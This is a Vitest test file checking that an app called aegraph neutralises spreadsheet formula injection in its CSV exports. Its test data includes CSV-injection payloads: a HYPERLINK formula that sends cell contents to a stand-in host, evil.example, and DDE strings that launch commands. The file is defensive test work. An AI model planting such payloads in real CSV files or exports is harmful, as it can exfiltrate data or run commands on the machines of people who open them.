import { describe, expect, it } from 'vitest'
import { datasetFromCsv, datasetToCsv } from '../../datasets/dataset'
import { splitDelimited } from '../../datasets/files'
import { createEntity, createRelationship } from '../../entity/entity'
import { toCsv } from '../../../lib/download'
import { serialize } from '../export'
import { CsvParser, csvEscape, csvEscapeRaw, csvRowToEntity, defuseCell, normalizeEntity, restoreCell } from '../formats'
import { parseNodesEdgesCsv, writeNodesEdgesCsv } from '../graph/nodesEdgesCsv'

/**
 * A CSV is opened in a spreadsheet as often as it is read back here, and a cell that starts with `=`, `+`, `-`,
 * `@`, a tab or a carriage return is a formula there. A label, a description, a dataset cell — text someone else
 * wrote — must not be one.
 */
const FORMULAS = ['=HYPERLINK("https://evil.example/?d="&A2,"click")', '+cmd|\' /C calc\'!A0', '-2+3+cmd|\' /C calc\'!A0', '@SUM(1+1)*cmd|\' /C calc\'!A0', '\t=1+1', '\r=1+1']
const rows = (text: string) => {
  const out: string[][] = []
  const p = new CsvParser()
  p.push(text, (r) => out.push(r))
  p.end((r) => out.push(r))
  return out
}

describe('defuseCell / restoreCell', () => {
  it('puts a quote before a formula, and leaves text and numbers alone', () => {
    for (const f of FORMULAS) expect(defuseCell(f), f).toBe(`'${f}`)
    for (const v of ['plain', '', '-5', '+1.5e3', '.5', '3.', "it's", '#tag', 'a=b']) expect(defuseCell(v), v).toBe(v)
  })
  it('is undone exactly, a cell that already started with a quote included', () => {
    for (const v of [...FORMULAS, "'=already quoted", "''-x", "'plain", 'plain', '-5']) expect(restoreCell(defuseCell(v)), v).toBe(v)
  })
  it('csvEscape defuses and quotes; csvEscapeRaw only quotes', () => {
    expect(csvEscape('=1+1')).toBe("'=1+1")
    expect(csvEscape('=SUM(A1,A2)')).toBe('"\'=SUM(A1,A2)"')
    expect(csvEscapeRaw('=SUM(A1,A2)')).toBe('"=SUM(A1,A2)"')
  })
})

describe('what aegraph writes as CSV', () => {
  it('an entity export holds no formula, and reads back as it was', () => {
    const entities = FORMULAS.map((f, i) => normalizeEntity({ id: `e${i}`, type: 'note', label: f, description: f, tags: [f.slice(0, 5)], data: { k: f } })!)
    const text = [...serialize({ entities }, 'csv')].join('')
    const parsed = rows(text)
    for (const row of parsed.slice(1)) for (const cell of row) expect(cell, cell).not.toMatch(/^[=+\-@\t\r]/)
    const header = parsed[0]
    expect(parsed.slice(1).filter((r) => r.length > 1).map((r) => csvRowToEntity(header, r))).toEqual(entities)
  })

  it('a dataset’s CSV holds no formula, and reads back as it was', () => {
    const data = datasetFromCsv(`a,b\n${FORMULAS.map((f) => `"'${f.replace(/"/g, '""')}",-3`).join('\n')}\n`)
    const csv = datasetToCsv(data)
    for (const row of rows(csv).slice(1)) if (row.length > 1) expect(row[0]).toMatch(/^'/)
    expect(datasetFromCsv(csv)).toEqual(data)
    expect(data.rows.map((r) => r[0])).toEqual(FORMULAS)
    expect(data.rows[0][1]).toBe(-3)
  })

  it('a dataset file read from CSV takes the quote off the same way', async () => {
    expect(await splitDelimited(`x\n'=1+1\n'plain\n`, ',')).toEqual([['x'], ['=1+1'], ["'plain"]])
  })

  it('the Gephi nodes/edges CSV holds no formula, and reads back as it was', async () => {
    const a = createEntity({ id: 'a', type: 'person', label: '=HYPERLINK("https://evil.example","x")', data: { note: '@cmd' } })
    const b = createEntity({ id: 'b', type: 'person', label: 'Bo' })
    const e = createRelationship({ id: 'e1', type: 'knows', source: { id: 'a' }, target: { id: 'b' }, label: '+cmd' })
    const [n, ed] = await writeNodesEdgesCsv({ nodes: [a, b], edges: [e], name: 'g' })
    for (const row of [...rows(n.text), ...rows(ed.text)]) for (const cell of row) expect(cell, cell).not.toMatch(/^[=+\-@\t\r]/)
    const p = await parseNodesEdgesCsv(n.text, ed.text)
    expect(p.nodes.find((x) => x.id === 'a')).toMatchObject({ label: '=HYPERLINK("https://evil.example","x")', attrs: { note: '@cmd' } })
    expect(p.edges[0].label).toBe('+cmd')
  })

  it('a table downloaded from the entity browser holds no formula', () => {
    const csv = toCsv([{ name: '=1+1', n: -2 }], [{ key: 'name', label: '@Name' }, { key: 'n', label: 'N' }])
    expect(csv).toBe("'@Name,N\n'=1+1,-2")
  })
})
